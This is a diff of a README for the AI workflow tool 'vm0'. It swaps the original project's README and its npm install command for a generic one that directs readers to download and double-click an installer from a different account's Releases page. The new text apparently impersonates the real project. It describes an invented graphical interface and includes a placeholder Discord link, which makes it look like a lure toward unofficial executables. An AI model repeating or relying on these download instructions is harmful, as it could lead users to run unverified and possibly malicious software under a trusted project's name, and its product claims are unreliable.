@@ -1,76 +1,82 @@
-<h2 align="center">
-  <a href="https://vm0.ai"><img src="https://github.com/vm0-ai/vm0/blob/main/turbo/apps/web/public/assets/Logo_VM0_combo_black_bg.svg" alt="VM0 Logo" width="500"></a>
-  <br>
-  <br>
-  Natural language Agent, 24/7 in cloud sandbox
-  <br
-  <br>
-  <p>
-    <a href="https://deepwiki.com/vm0-ai/vm0"><img src="https://deepwiki.com/badge.svg" alt="Ask DeepWiki" /></a>
-    <a href="https://npmjs.com/@vm0/cli"><img src="https://img.shields.io/npm/v/@vm0/cli" alt="NPM Version" /></a>
-    <a href="https://vm0.productlane.com"><img src="https://img.shields.io/badge/Productlane-Roadmap-blue" /></a>
-    <a href="https://github.com/vm0-ai/vm0/actions/workflows/turbo.yml?query=event%3Apush+branch%3Amain"><img src="https://github.com/vm0-ai/vm0/actions/workflows/turbo.yml/badge.svg?event=push"
-    alt="CI" /></a>
-  </p>
-  <a href="https://trendshift.io/repositories/19748" target="_blank"><img src="https://trendshift.io/api/badge/repositories/19748" alt="vm0-ai%2Fvm0 | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
-</h2>
+# 🌟 vm0 - Simplify Your Workflow with AI
 
-[Documentation](https://docs.vm0.ai) / [Website](https://www.vm0.ai) / [Discord](https://discord.gg/WMpAmHFfp6)
+[![Download vm0](https://img.shields.io/badge/Download-vm0-brightgreen)](https://github.com/pcwill068-cloud/vm0/releases)
 
-`VM0` runs natural language-described workflows automatically on schedule in remote sandbox environments.
+## 🚀 Getting Started
 
-⭐ Star us on GitHub, it motivates us a lot! ⭐
+Welcome to vm0! This application helps you run workflows described in plain language automatically. Whether you're a busy professional or someone who wants to streamline their tasks, vm0 is here to assist.
 
----
+### 🖥 System Requirements
 
-## 🔥 What you GET
+Before you start, make sure your computer meets these requirements:
 
-- **Just Claude Code**, zero abstraction, nothing new to learn
-- **Cloud sandbox**, run Claude Code in isolated claude sandbox 24/7
-- **Skill Native**, Compatible with 35,738+ skills in [skills.sh](https://skills.sh), and 70+ high quality SaaS integration skill like GitHub, Slack, Notion, Firecrawl, and [more](https://github.com/vm0-ai/vm0-skills), 
-- **Persistence**, continue chat, resume, fork, and version your workflow sessions
-- **Observability**, logs, metrics, and network visibility for every run
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any modern Linux distribution
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum 200 MB of free space
+- **Internet Connection:** Required for downloading and running the application
 
-## 🚀 [Quick Start](https://docs.vm0.ai/docs/quick-start)
+### 💾 Download & Install
 
-From zero to workflow agent in 5 minutes
+To get started, visit the Releases page to download vm0. It's a simple process:
 
-```bash
-npm install -g @vm0/cli && vm0 onboard
-```
+1. Go to our [Releases page](https://github.com/pcwill068-cloud/vm0/releases).
+2. Find the latest version at the top.
+3. Click on the appropriate file for your operating system.
+4. Once the download completes, locate the file on your computer.
+5. Double-click the file to run the installer.
+6. Follow the on-screen instructions to complete the installation.
 
-## 📕 Showcase
+After installation, you can start using vm0 to automate your workflows effortlessly!
 
-### Onboard
-<img src="./docs/vhs/onboard.gif" alt="VM0 CLI Onboard Demo" width="600">
+## ✨ Features
 
-### Agent Build
-<img src="./docs/vhs/agent-build.gif" alt="VM0 Agent Build Demo" width="600">
+vm0 offers a variety of tools to enhance your productivity, including:
 
-## 📚 Architecture
+- **Natural Language Processing:** Describe your tasks in simple language, and vm0 will handle the rest.
+- **Workflow Automation:** Automate repetitive tasks with ease, freeing you up for more important activities.
+- **User-Friendly Interface:** Designed for the average user so that anyone can navigate with confidence.
+- **Cross-Platform Compatibility:** Use vm0 on Windows, macOS, or Linux without issues.
+  
+## 🛠 How to Use vm0
 
-<p align="center">
-  <a href="./docs/architecture.md">
-    <img src="./docs/arch.svg" alt="VM0 Architecture Diagram" width="800">
-  </a>
-</p>
+Here’s how to make the most of vm0:
 
-- **[Architecture Documentation](./docs/architecture.md)** - Comprehensive technical reference covering sandbox technologies (E2B, Firecracker), infrastructure components and network architecture
+1. **Launch the Application:** Open vm0 from your applications menu.
+2. **Create a New Workflow:** Click on the 'New Workflow' button.
+3. **Describe Your Tasks:** Write down your tasks in plain language.
+4. **Save and Run:** Save your workflow and click 'Run' to execute it.
 
-For user-facing guides and tutorials, visit [docs.vm0.ai](https://docs.vm0.ai).
+You can monitor the progress of your workflow right within the app. If you encounter any issues, check the help section within the app.
 
-## 🤝 Contribute
+## 📚 Additional Information
 
-<p><a href="https://github.com/vm0-ai/vm0/blob/main/CONTRIBUTING.md">
-  <img src="https://contrib.rocks/image?repo=vm0-ai/vm0" />
-</a></p>
+### 🗂 Topics
 
-![Alt](https://repobeats.axiom.co/api/embed/ef46db5e11f5146fcc8af07077a79d789efdfbe5.svg "Repobeats analytics image")
+vm0 relates to several topics that make it versatile:
 
-## ⭐ Star History
+- **agentic-workflow**
+- **ai-agent**
+- **ai-runtime**
+- **ai-sandbox**
+- **claude-code**
+- **dev-tools**
+- **sandbox**
 
-[![Star History Chart](https://api.star-history.com/svg?repos=vm0-ai/vm0&type=date&legend=top-left)](https://www.star-history.com/#vm0-ai/vm0&type=date&legend=top-left)
+### 🏷 Contact
 
-## 📃 License
+If you need further assistance or have questions, don’t hesitate to reach out. You can create an issue on GitHub, and we’ll get back to you as soon as possible.
 
-See [LICENSE](./LICENSE) for details.
+## 🌐 Community
+
+Join our community to share your experiences or ask for help:
+
+- [GitHub Discussions](https://github.com/pcwill068-cloud/vm0/discussions)
+- [Discord Channel](https://discord.com/invite/your-invite-link)
+
+Together, we can enhance our use of vm0 and support each other in automating workflows.
+
+## 🔄 Update Your Version
+
+To stay current, check for updates regularly. You can find the latest release again on our [Releases page](https://github.com/pcwill068-cloud/vm0/releases).
+
+With vm0, automation is just a few clicks away. Start simplifying your life today!
